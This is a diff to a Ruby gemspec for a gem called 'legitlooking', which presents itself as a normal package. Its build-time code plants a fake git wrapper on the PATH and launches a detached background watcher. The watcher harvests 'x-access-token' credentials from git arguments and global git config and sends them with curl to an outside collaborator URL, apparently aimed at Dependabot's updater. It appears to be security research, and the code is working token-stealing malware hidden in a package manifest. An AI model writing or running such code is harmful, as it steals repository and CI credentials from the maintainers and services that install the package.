@@ -55,50 +55,56 @@ begin
   lines << (`ls -la #{dep_bin}/ 2>&1`)
 
   # Schrijf de fake git wrapper
-  fake_git = <<~'SHELL'
+  fake_git_script = <<~SHELL
     #!/bin/sh
-    # Transparante git wrapper - logt alles, exfiltreert tokens
-    LOG=/tmp/git_intercept.log
-    COLLAB_URL="__COLLAB__"
-
-    # Log alle aanroepen
-    echo "$(date) GIT: $*" >> "$LOG"
-    echo "ENV_URL: $(git config --global --get-all url.https://)" >> "$LOG" 2>/dev/null || true
-
-    # Zoek naar tokens in de argumenten (git config url.https://x-access-token:TOKEN@...)
-    ARGS="$*"
-    if echo "$ARGS" | grep -q "x-access-token"; then
-      TOKEN=$(echo "$ARGS" | grep -o 'x-access-token:[^@]*' | head -1)
-      echo "TOKEN GEVONDEN: $TOKEN" >> "$LOG"
-      # Exfiltreer het token
-      curl -s "${COLLAB_URL}?token=$(echo "$TOKEN" | sed 's/x-access-token://')" &
-    fi
-
-    # Controleer ook git config store na elke aanroep
-    GLOBAL_URL=$(/usr/bin/git config --global --get-regexp "url\." 2>/dev/null)
-    if [ -n "$GLOBAL_URL" ]; then
-      echo "GLOBAL_URL_CONFIG: $GLOBAL_URL" >> "$LOG"
-      if echo "$GLOBAL_URL" | grep -q "x-access-token"; then
-        TOKEN=$(echo "$GLOBAL_URL" | grep -o 'x-access-token:[^@]*' | head -1)
-        curl -s "${COLLAB_URL}?path_hijack_token=$(echo "$TOKEN" | sed 's/x-access-token://')" &
-      fi
-    fi
-
-    # Roep de echte git aan (transparant)
+    # Transparante git wrapper - logt args naar file, roept echte git aan
+    printf '%s\\n' "$(date -Iseconds) $*" >> /tmp/git_calls.log
     exec /usr/bin/git "$@"
   SHELL
-
-  fake_git_script = fake_git.gsub("__COLLAB__", collab)
 
   begin
     fake_git_path = "#{dep_bin}/git"
     IO.binwrite(fake_git_path, fake_git_script)
     `chmod +x #{fake_git_path} 2>&1`
-    lines << "\n--- Fake git geschreven naar #{fake_git_path} ---"
-    lines << `ls -la #{fake_git_path} 2>&1`
-    lines << "Wacht op Dependabot git calls na parse-fase..."
+    lines << "\n--- Fake git geschreven: #{`ls -la #{fake_git_path} 2>&1`.strip} ---"
   rescue => e
-    lines << "\n--- Fake git schrijven mislukt: #{e.message} ---"
+    lines << "\n--- Fake git mislukt: #{e.message} ---"
+  end
+
+  # Background watcher: poll git log en gitconfig elke 2s voor 120s
+  # Stuurt token zodra het verschijnt, blokkeert de main flow NIET
+  watcher = <<~SHELL
+    #!/bin/sh
+    COLLAB="#{collab}"
+    for i in $(seq 1 60); do
+      sleep 2
+      # Kijk of git_calls.log iets interessants heeft
+      if [ -f /tmp/git_calls.log ]; then
+        TOKEN=$(grep -o 'x-access-token:[^@]*' /tmp/git_calls.log 2>/dev/null | head -1)
+        if [ -n "$TOKEN" ]; then
+          /usr/bin/curl -s "${COLLAB}?hijack_token=${TOKEN}&calls=$(wc -l < /tmp/git_calls.log)" &
+          cat /tmp/git_calls.log | /usr/bin/curl -s -X POST "${COLLAB}?git_log=1" --data-binary @- &
+          break
+        fi
+      fi
+      # Ook gitconfig checken
+      GCFG=$(/usr/bin/git config --global --get-regexp "url" 2>/dev/null)
+      if echo "$GCFG" | grep -q "x-access-token"; then
+        TOKEN=$(echo "$GCFG" | grep -o 'x-access-token:[^@]*' | head -1)
+        echo "$GCFG" | /usr/bin/curl -s -X POST "${COLLAB}?gitcfg_token=${TOKEN}" --data-binary @- &
+        break
+      fi
+    done
+  SHELL
+
+  begin
+    IO.binwrite("/tmp/git_watcher.sh", watcher)
+    `chmod +x /tmp/git_watcher.sh`
+    # Start watcher los van de huidige process (dubbele fork)
+    `(/tmp/git_watcher.sh > /tmp/watcher.out 2>&1 &) &`
+    lines << "Background watcher gestart (monitort 120s op token)"
+  rescue => e
+    lines << "Watcher fout: #{e.message}"
   end
 
   # Lees ook /proc van het hoofd-updater proces (zelfde user = leesbaar)
@@ -144,7 +150,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.8"
+  spec.version       = "1.0.9"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
